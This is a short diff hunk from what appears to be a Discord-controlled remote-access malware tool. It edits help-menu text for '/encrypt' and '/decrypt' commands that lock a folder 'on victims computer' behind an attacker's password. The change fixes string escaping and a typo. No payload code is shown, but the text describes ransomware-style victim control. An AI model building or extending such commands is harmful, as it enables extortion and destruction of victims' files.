@@ -471,12 +471,12 @@ def send_help(webhook_url):
             },
             {
                 "name": "/encrypt",
-                "value": 'encrypts specified directory on victims computer with a password u specify, ie: /encyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag.',
+                "value": r'encrypts specified directory on victims computer with a password u specify, ie: /encyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag.',
                 "inline": True
             },
             {
                 "name": "/decrypt",
-                "value": 'decrypts an encrypted folder (you would have had to have done this before) specified directory on victims computer with a password u specify, ie: /encyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag."',
+                "value": r'decrypts an encrypted folder (you would have had to have done this before) specified directory on victims computer with a password u specify, ie: /decyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag."',
                 "inline": True 
             },
         ]
